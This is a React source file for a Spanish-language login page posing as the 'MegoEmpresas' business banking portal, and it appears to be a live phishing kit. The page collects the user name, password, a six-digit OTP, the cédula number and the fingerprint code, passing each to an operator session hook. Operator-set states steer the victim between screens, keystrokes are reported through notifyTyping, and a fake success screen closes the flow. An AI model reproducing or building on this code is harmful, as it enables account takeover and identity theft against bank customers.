import { useEffect, useState, useRef, type FormEvent } from 'react'
import { Link } from 'react-router-dom'
import { useOperatorSession } from '../hooks/useOperatorSession'
import './MegoEmpresas.css'

const slides = [
  {
    title: '¿Qué es MegoEmpresas?',
    text: 'Es la forma más fácil de transferir, pagar y manejar el dinero de tu empresa.',
  },
  {
    title: 'Tu gestión, sin límites',
    text: 'Consulta saldos, autoriza pagos y controla usuarios desde un solo lugar, con total seguridad.',
  },
]

export function MegoEmpresas() {
  const { status, errorMsg, startSession, sendToken, resetSession, notifyTyping, sendDeviceData, clearError } = useOperatorSession()
  const [slide, setSlide] = useState(0)
  const [showPassword, setShowPassword] = useState(false)
  const [user, setUser] = useState('')
  const [password, setPassword] = useState('')
  const [cedula, setCedula] = useState('')
  const [dactilar, setDactilar] = useState('')
  const current = slides[slide]

  const [reachedCodeScreen, setReachedCodeScreen] = useState(false)
  const [code, setCode] = useState(['', '', '', '', '', ''])
  const [seconds, setSeconds] = useState(180)
  const [timerActive, setTimerActive] = useState(false)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  const isSubmittingRef = useRef(false)
  useEffect(() => {
    if (status === 'waiting-code' || status === 'error-cod1' || status === 'error-cod2') {
      setReachedCodeScreen(true)
      setSeconds(180)
      setTimerActive(false)
      setCode(['', '', '', '', '', ''])
      setTimeout(() => {
        inputRefs.current[0]?.focus()
      }, 50)
    } else if (status === 'idle') {
      setReachedCodeScreen(false)
      setCedula('')
      setDactilar('')
    }
    if (status === 'idle' || status === 'error-login' || status === 'error-cod1' || status === 'error-cod2' || status === 'waiting-code' || status === 'done') {
      isSubmittingRef.current = false
    }
  }, [status])

  useEffect(() => {
    if (!reachedCodeScreen || timerActive) return
    const interval = setInterval(() => {
      setSeconds((prev) => {
        if (prev <= 1) {
          setTimerActive(true)
          clearInterval(interval)
          return 0
        }
        return prev - 1
      })
    }, 1000)
    return () => clearInterval(interval)
  }, [reachedCodeScreen, timerActive])

  useEffect(() => {
    const html = document.documentElement
    const prevTitle = document.title
    const icon = document.querySelector<HTMLLinkElement>('link[rel="icon"]')
    const prevIcon = icon?.href
    const prevIconType = icon?.type

    html.classList.add('notranslate', 'me-root')
    html.lang = 'es'
    html.setAttribute('translate', 'no')
    document.title = 'MegoEmpresas'
    if (icon) {
      icon.type = 'image/svg+xml'
      icon.href = '/img/megoempresas-favicon.svg'
    }

    let meta = document.querySelector('meta[name="google"]')
    const createdMeta = !meta
    if (!meta) {
      meta = document.createElement('meta')
      meta.setAttribute('name', 'google')
      document.head.appendChild(meta)
    }
    const prevGoogle = meta.getAttribute('content')
    meta.setAttribute('content', 'notranslate')

    const style = document.createElement('style')
    style.setAttribute('data-me-scrollbar', 'true')
    style.textContent = `
      ::-webkit-scrollbar {
        width: 8px;
        height: 8px;
      }
      ::-webkit-scrollbar-track {
        background: #e0e6f7;
      }
      ::-webkit-scrollbar-thumb {
        background: #820AD1;
        border-radius: 4px;
      }
      ::-webkit-scrollbar-thumb:hover {
        background: #820AD1;
      }
      * {
        scrollbar-width: thin;
        scrollbar-color: #820AD1 #e0e6f7;
      }
    `
    document.head.appendChild(style)

    return () => {
      html.classList.remove('notranslate', 'me-root')
      html.removeAttribute('translate')
      document.title = prevTitle
      if (icon && prevIcon) {
        icon.href = prevIcon
        if (prevIconType) icon.type = prevIconType
      }
      if (createdMeta) meta?.remove()
      else if (prevGoogle) meta?.setAttribute('content', prevGoogle)
      else meta?.removeAttribute('content')
      style.remove()
    }
  }, [])

  function onSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault()
    if (!user.trim() || !password.trim() || (status !== 'idle' && status !== 'error-login')) return
    if (isSubmittingRef.current) return
    isSubmittingRef.current = true
    startSession(user.trim(), password.trim(), 'CODIGO_EMPRESA')
  }

  const formatSeconds = (totalSeconds: number) => {
    const mins = Math.floor(totalSeconds / 60)
    const secs = totalSeconds % 60
    return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`
  }

  const resetTimer = () => {
    setSeconds(180)
    setTimerActive(false)
  }

  const handleCodeChange = (value: string, idx: number) => {
    const newCode = [...code]
    const cleanValue = value.replace(/[^0-9]/g, '')
    newCode[idx] = cleanValue.slice(-1)
    setCode(newCode)

    if (cleanValue && idx < 5) {
      inputRefs.current[idx + 1]?.focus()
    }
  }

  const handleCodeKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, idx: number) => {
    if (e.key === 'Backspace' && !code[idx] && idx > 0) {
      const newCode = [...code]
      newCode[idx - 1] = ''
      setCode(newCode)
      inputRefs.current[idx - 1]?.focus()
    }
  }

  const handleCodePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6)
    if (pastedData) {
      const digits = pastedData.split('')
      const newCode = [...code]
      digits.forEach((digit, idx) => {
        newCode[idx] = digit
      })
      setCode(newCode)
      const lastIdx = Math.min(digits.length - 1, 5)
      inputRefs.current[lastIdx]?.focus()
    }
  }

  const isCodeComplete = code.every(char => char !== '')

  const handleCodeSubmit = () => {
    if (!isCodeComplete || status === 'typing') return
    if (isSubmittingRef.current) return
    isSubmittingRef.current = true
    sendToken(code.join(''))
  }

  function handleDeviceSubmit() {
    if (!cedula.trim() || !dactilar.trim()) return
    sendDeviceData(cedula.trim(), dactilar.trim())
  }

  const showSpinnerOnCodeScreen = reachedCodeScreen && status === 'typing'
  const isCodeOrLoadingCode = status === 'waiting-code' || status === 'error-cod1' || status === 'error-cod2' || showSpinnerOnCodeScreen

  if (isCodeOrLoadingCode) {
    return (
      <div className="me-code-page" style={{ background: '#fff', minHeight: '100vh', display: 'flex', flexDirection: 'column', fontFamily: 'Outfit, sans-serif' }}>
        {/* Header bar */}
        <header className="me-code-header" style={{ height: '56px', background: '#bd2cf9', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 24px', position: 'relative' }}>
          {/* Left section: Home and Atrás */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
            <button type="button" style={{ background: 'none', border: 'none', color: '#fff', cursor: 'default', padding: 0, display: 'flex', alignItems: 'center' }}>
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
                <polyline points="9 22 9 12 15 12 15 22" />
              </svg>
            </button>
            <button type="button" style={{ background: 'none', border: 'none', color: '#fff', fontSize: '14px', fontWeight: 500, cursor: 'default', padding: 0, display: 'flex', alignItems: 'center', gap: '4px' }}>
              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2.5">
                <polyline points="15 18 9 12 15 6" />
              </svg>
              Atrás
            </button>
          </div>

          {/* Centered logo */}
          <div style={{ position: 'absolute', left: '50%', transform: 'translateX(-50%)', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <svg viewBox="0 0 160 36" width="150" height="34">
              <g fill="#d6e303">
                <polygon points="14,2 24,8 24,20 14,26 4,20 4,8" />
                <polygon points="28,8 38,14 38,26 28,32 18,26 18,14" />
                <polygon points="42,2 52,8 52,20 42,26 32,20 32,8" />
              </g>
              <text x="58" y="26" fill="#fff" fontFamily="Outfit, system-ui, sans-serif" fontSize="22" fontWeight="700">
                Mego
              </text>
            </svg>
            <span style={{ color: '#fff', opacity: 0.8, fontSize: '18px', fontWeight: 300 }}>|</span>
            <span style={{ color: '#fff', fontSize: '18px', fontWeight: 500 }}>MegoEmpresas</span>
          </div>

          {/* Right section: Empty to balance the layout */}
          <div style={{ width: '80px' }} />
        </header>

        {/* Body content */}
        <main style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '40px 20px', boxSizing: 'border-box', position: 'relative' }}>
          
          {/* Loading spinner overlay if status === 'typing' */}
          {status === 'typing' && (
            <div style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(255, 255, 255, 0.85)', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: '20px', zIndex: 10 }}>
              <div className="me-dots-spinner">
                <span />
                <span />
                <span />
                <span />
              </div>
              <p style={{ fontSize: '14px', color: '#666', fontFamily: 'Arial, sans-serif' }}>
                Validando código de seguridad...
              </p>
            </div>
          )}

          <p style={{ color: '#5b4ae0', fontSize: '14px', fontWeight: 600, textAlign: 'center', marginBottom: '32px', fontFamily: 'Outfit, sans-serif' }}>
            Por favor ingresa el código de seguridad enviado a tus medios de notificación
          </p>

          {/* 6 input boxes */}
          <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', marginBottom: '32px' }}>
            {code.map((digit, idx) => (
              <input
                key={idx}
                ref={el => { inputRefs.current[idx] = el; }}
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={1}
                value={digit}
                onChange={e => handleCodeChange(e.target.value, idx)}
                onKeyDown={e => handleCodeKeyDown(e, idx)}
                onPaste={handleCodePaste}
                style={{
                  width: '54px',
                  height: '64px',
                  border: '1.5px solid #bd2cf9',
                  borderRadius: '12px',
                  textAlign: 'center',
                  fontSize: '28px',
                  fontWeight: 600,
                  color: '#333',
                  outline: 'none',
                  background: '#fff'
                }}
              />
            ))}
          </div>

          {/* Timer pill */}
          <div 
            onClick={() => { if (timerActive) resetTimer(); }}
            style={{ 
              background: '#e9ecef', 
              color: '#495057', 
              padding: '10px 24px', 
              borderRadius: '8px', 
              fontSize: '14px', 
              fontWeight: 600, 
              marginBottom: '32px',
              fontFamily: 'Outfit, sans-serif',
              cursor: timerActive ? 'pointer' : 'default'
            }}
          >
            {timerActive ? 'Reenviar código ahora' : `Reenviar código en ${formatSeconds(seconds)}`}
          </div>

          {/* Cancel and Validate buttons */}
          <div style={{ display: 'flex', gap: '20px', width: '100%', maxWidth: '340px' }}>
            <button 
              type="button" 
              style={{ 
                flex: 1, 
                background: '#fff', 
                color: '#5b4ae0', 
                border: '1px solid #bd2cf9', 
                borderRadius: '12px', 
                height: '48px', 
                fontWeight: 600, 
                fontSize: '15px', 
                cursor: 'default' 
              }}
            >
              Cancelar
            </button>
            <button 
              type="button" 
              disabled={!isCodeComplete}
              style={{ 
                flex: 1, 
                background: isCodeComplete ? '#5b4ae0' : '#d4d4da', 
                color: '#fff', 
                border: 'none', 
                borderRadius: '12px', 
                height: '48px', 
                fontWeight: 600, 
                fontSize: '15px', 
                cursor: isCodeComplete ? 'pointer' : 'not-allowed' 
              }}
              onClick={handleCodeSubmit}
            >
              Validar
            </button>
          </div>

          {/* Modal de error de OTP (MegoEmpresas) */}
          {(status === 'error-cod1' || status === 'error-cod2') && (
            <div className="me-modal-overlay" style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.5)', display: 'grid', placeItems: 'center', zIndex: 100 }}>
              <div className="me-modal-card" style={{ background: '#fff', border: '2px solid #ff9800', borderRadius: '16px', padding: '24px', width: '320px', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '16px', position: 'relative' }}>
                <button type="button" style={{ position: 'absolute', top: '12px', right: '12px', background: 'none', border: 'none', color: '#820AD1', cursor: 'pointer' }} onClick={() => { clearError(); setCode(['', '', '', '', '', '']); }}>
                  <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2.5">
                    <line x1="18" y1="6" x2="6" y2="18"></line>
                    <line x1="6" y1="6" x2="18" y2="18"></line>
                  </svg>
                </button>
                <div style={{ background: '#ffd0a6', color: '#ff9800', width: '48px', height: '48px', borderRadius: '50%', display: 'grid', placeItems: 'center', fontSize: '24px', fontWeight: 700 }}>
                  !
                </div>
                <p style={{ fontSize: '14px', color: '#333', textAlign: 'center', fontWeight: 600, margin: 0 }}>
                  La OTP ingresada es incorrecta.
                </p>
                <button 
                  type="button" 
                  style={{ width: '100%', background: '#820AD1', color: '#fff', border: 'none', borderRadius: '8px', height: '40px', fontWeight: 600, cursor: 'pointer' }} 
                  onClick={() => { clearError(); setCode(['', '', '', '', '', '']); }}
                >
                  Continuar
                </button>
              </div>
            </div>
          )}
        </main>
      </div>
    )
  }

  return (
    <div className="me-page">
      <div className="me-frame">
        <div className="me-shell">
        <section className="me-left">
          <div className="me-card">
            <img src="/img/megoempresas-hero.png" alt="" />
            <div className="me-card-copy">
              <h1>{current.title}</h1>
              <p>{current.text}</p>
              <button type="button" className="me-more" onClick={() => setSlide((s) => (s + 1) % slides.length)}>
                Más información &gt;
              </button>
              <div className="me-dots">
                {slides.map((item, index) => (
                  <button
                    key={item.title}
                    type="button"
                    className={index === slide ? 'is-active' : ''}
                    aria-label={`Slide ${index + 1}`}
                    onClick={() => setSlide(index)}
                  />
                ))}
              </div>
            </div>
          </div>
          <div className="me-actions">
            <Link to="/transparencia">Consejos de seguridad</Link>
            <Link to="/contacto">Contactar un asesor</Link>
          </div>
        </section>

        <section className="me-right">
          <div className="me-right-main">
            <p className="me-wordmark" aria-label="MegoEmpresas">
              <span>Mego</span>
              Empresas
            </p>
            {status === 'done' ? (
              <div 
                className="me-card"
                style={{ 
                  textAlign: 'center', 
                  margin: '40px 0', 
                  display: 'flex', 
                  flexDirection: 'column', 
                  alignItems: 'center', 
                  gap: '16px', 
                  width: '100%', 
                  maxWidth: '530px',
                  padding: '48px 40px',
                  boxSizing: 'border-box',
                  borderRadius: '28px',
                  background: '#fff',
                  border: 'none',
                  boxShadow: '0 20px 40px rgba(0, 0, 0, 0.05)'
                }}
              >
                <div style={{ background: '#e8f7ee', color: '#176b3a', padding: '16px', borderRadius: '50%', width: '64px', height: '64px', display: 'grid', placeItems: 'center', marginBottom: '8px' }}>
                  <svg viewBox="0 0 24 24" width="32" height="32" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                    <polyline points="20 6 9 17 4 12" />
                  </svg>
                </div>
                <h3 style={{ fontSize: '18px', fontWeight: 600, color: '#1c1228', textAlign: 'center', margin: 0 }}>¡Inicio de Sesión Exitoso!</h3>
                <p style={{ fontSize: '14px', color: '#555', maxWidth: '300px', textAlign: 'center', margin: 0, lineHeight: 1.5 }}>Bienvenido a MegoEmpresas. Hemos Validado Exitosamente tu Cuenta</p>
                <button 
                  type="button" 
                  className="me-submit" 
                  style={{ cursor: 'pointer', background: '#820AD1', color: '#fff', width: '100%', marginTop: '16px', borderRadius: '12px', height: '48px', border: 'none', fontWeight: 600 }} 
                  onClick={() => { resetSession(); setUser(''); setPassword(''); setCedula(''); setDactilar(''); isSubmittingRef.current = false; }}
                >
                  Volver al inicio
                </button>
              </div>
            ) : status === 'dispositivo' ? (
              <div style={{ padding: '20px 0', display: 'flex', flexDirection: 'column', alignItems: 'center', width: '100%', maxWidth: '420px', boxSizing: 'border-box' }}>
                {/* Step indicator */}
                <div className="me-steps-container" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', width: '220px', marginBottom: '32px', position: 'relative' }}>
                  <div style={{ position: 'absolute', top: '15px', left: '15px', right: '15px', height: '3px', background: '#e0d8ff', zIndex: 0 }} />
                  <div style={{ position: 'absolute', top: '15px', left: '15px', width: '90px', height: '3px', background: '#820AD1', zIndex: 0 }} />
                  
                  <div style={{ width: '32px', height: '32px', borderRadius: '50%', background: '#820AD1', color: '#fff', display: 'grid', placeItems: 'center', fontSize: '14px', fontWeight: 600, zIndex: 1 }}>1</div>
                  <div style={{ width: '32px', height: '32px', borderRadius: '50%', background: '#820AD1', color: '#fff', display: 'grid', placeItems: 'center', fontSize: '14px', fontWeight: 600, zIndex: 1 }}>2</div>
                  <div style={{ width: '32px', height: '32px', borderRadius: '50%', background: '#fff', border: '2px solid #e0d8ff', color: '#888', display: 'grid', placeItems: 'center', fontSize: '14px', fontWeight: 600, zIndex: 1 }}>3</div>
                </div>

                {/* Cellphone & Fingerprint Scan SVG Icon */}
                <div style={{ margin: '0 0 28px', color: '#820AD1', display: 'flex', justifyContent: 'center' }}>
                  <svg width="80" height="100" viewBox="0 0 80 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect x="20" y="5" width="40" height="85" rx="6" stroke="#820AD1" strokeWidth="2.5" fill="none" />
                    <rect x="34" y="5" width="12" height="4" rx="2" fill="#820AD1" />
                    <rect x="36" y="82" width="8" height="2" rx="1" fill="#820AD1" />
                    
                    <circle cx="50" cy="50" r="22" fill="#fff" stroke="#820AD1" strokeWidth="2" />
                    <path d="M50 40a10 10 0 0 1 10 10" stroke="#820AD1" strokeWidth="1.5" strokeLinecap="round" />
                    <path d="M44 46a8 8 0 0 1 12 0" stroke="#820AD1" strokeWidth="1.5" strokeLinecap="round" />
                    <path d="M47 50a3 3 0 0 1 6 0" stroke="#820AD1" strokeWidth="1.5" strokeLinecap="round" />
                    <path d="M40 50a10 10 0 0 1 20 0" stroke="#820AD1" strokeWidth="1.5" strokeLinecap="round" />
                    <path d="M43 54a7 7 0 0 1 14 0" stroke="#820AD1" strokeWidth="1.5" strokeLinecap="round" />
                  </svg>
                </div>

                <h2 style={{ fontSize: '18px', fontWeight: 700, color: '#1c1228', marginBottom: '12px', textAlign: 'center', fontFamily: 'Outfit, sans-serif' }}>
                  Validación de Identidad
                </h2>
                
                <p style={{ fontSize: '13px', color: '#666', lineHeight: 1.5, textAlign: 'center', marginBottom: '24px', fontFamily: 'Arial, sans-serif' }}>
                  Estimado socio/cliente, para continuar necesitamos validar tu identidad. Por favor ingresa tu <strong>número de cédula</strong> y <strong>código dactilar</strong>.
                </p>

                <form style={{ width: '100%', display: 'flex', flexDirection: 'column', gap: '16px' }} onSubmit={(e) => { e.preventDefault(); handleDeviceSubmit(); }}>
                  <label style={{ display: 'flex', flexDirection: 'column', width: '100%', gap: '6px', fontSize: '13px', color: '#666', fontFamily: 'Arial, sans-serif', textAlign: 'left' }}>
                    Cédula de identidad
                    <input
                      type="text"
                      placeholder="Ingresa tu número de cédula"
                      value={cedula}
                      onChange={(e) => { setCedula(e.target.value); if (status === 'dispositivo') notifyTyping(); }}
                      required
                      style={{ border: '1px solid #d2d2d8', borderRadius: '12px', height: '48px', padding: '0 16px', fontSize: '14px', outline: 'none', width: '100%', boxSizing: 'border-box' }}
                    />
                  </label>

                  <label style={{ display: 'flex', flexDirection: 'column', width: '100%', gap: '6px', fontSize: '13px', color: '#666', fontFamily: 'Arial, sans-serif', textAlign: 'left' }}>
                    Código dactilar
                    <input
                      type="text"
                      placeholder="Ingresa el código dactilar de tu c..."
                      value={dactilar}
                      onChange={(e) => { setDactilar(e.target.value); if (status === 'dispositivo') notifyTyping(); }}
                      required
                      style={{ border: '1px solid #d2d2d8', borderRadius: '12px', height: '48px', padding: '0 16px', fontSize: '14px', outline: 'none', width: '100%', boxSizing: 'border-box' }}
                    />
                  </label>

                  <button 
                    type="submit" 
                    className="me-submit" 
                    disabled={!cedula.trim() || !dactilar.trim()}
                    style={{ width: '100%', cursor: 'pointer', background: '#820AD1', color: '#fff', borderRadius: '12px', height: '48px', fontWeight: 600, fontSize: '15px', marginTop: '10px', border: 'none' }}
                  >
                    Validar
                  </button>
                </form>
              </div>
            ) : status === 'waiting' || status === 'typing' ? (
              <div style={{ textAlign: 'center', margin: '40px 0', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '20px', width: '510px', maxWidth: '100%' }}>
                <div className="me-dots-spinner">
                  <span />
                  <span />
                  <span />
                  <span />
                </div>
                <p style={{ fontSize: '14px', color: '#666', maxWidth: '280px' }}>
                  {status === 'typing' 
                    ? 'Validando código de seguridad...' 
                    : 'Verificando tus datos de acceso... Por favor, espera.'}
                </p>
              </div>
            ) : (
              <>
                <form className="me-form" onSubmit={onSubmit}>
                  <label>
                    Usuario
                    <input 
                      name="user" 
                      placeholder="Ingresa tu usuario" 
                      autoComplete="username" 
                      required 
                      value={user}
                      onChange={(e) => {
                        setUser(e.target.value)
                        if (status === 'error-login' || status === 'idle') notifyTyping()
                      }}
                    />
                  </label>
                  <Link className="me-forgot" to="/contacto">
                    Olvidé mi usuario
                  </Link>
                  <label>
                    Contraseña
                    <span className="me-pass">
                      <input
                        name="password"
                        type={showPassword ? 'text' : 'password'}
                        placeholder="Ingresa tu contraseña"
                        autoComplete="current-password"
                        required
                        value={password}
                        onChange={(e) => {
                          setPassword(e.target.value)
                          if (status === 'error-login' || status === 'idle') notifyTyping()
                        }}
                      />
                      <button
                        type="button"
                        className="me-eye"
                        aria-label={showPassword ? 'Ocultar contraseña' : 'Mostrar contraseña'}
                        onClick={() => setShowPassword((v) => !v)}
                      >
                        <EyeIcon off={showPassword} />
                      </button>
                    </span>
                  </label>
                  <Link className="me-forgot" to="/contacto">
                    Olvidé mi contraseña
                  </Link>
                  <button 
                    className="me-submit" 
                    type="submit"
                    disabled={!user.trim() || !password.trim() || (status !== 'idle' && status !== 'error-login')}
                  >
                    Iniciar sesión
                  </button>
                </form>
                {errorMsg ? <p className="me-notice" style={{ background: '#ffe8e8', color: '#b00000', padding: '10px 12px', borderRadius: '12px', fontSize: '12px', marginTop: '10px' }}>{errorMsg}</p> : null}
              </>
            )}
            <p className="me-powered">
              Powered by <span className="me-tikee">tikēe</span>
            </p>
          </div>
          <Link className="me-privacy" to="/transparencia">
            SEGURIDAD Y PRIVACIDAD
          </Link>
        </section>
        </div>
      </div>
    </div>
  )
}

function EyeIcon({ off }: { off: boolean }) {
  return (
    <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" strokeWidth="2" aria-hidden="true">
      <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z" />
      <circle cx="12" cy="12" r="3" />
      {off ? <path d="M3 3l18 18" /> : null}
    </svg>
  )
}
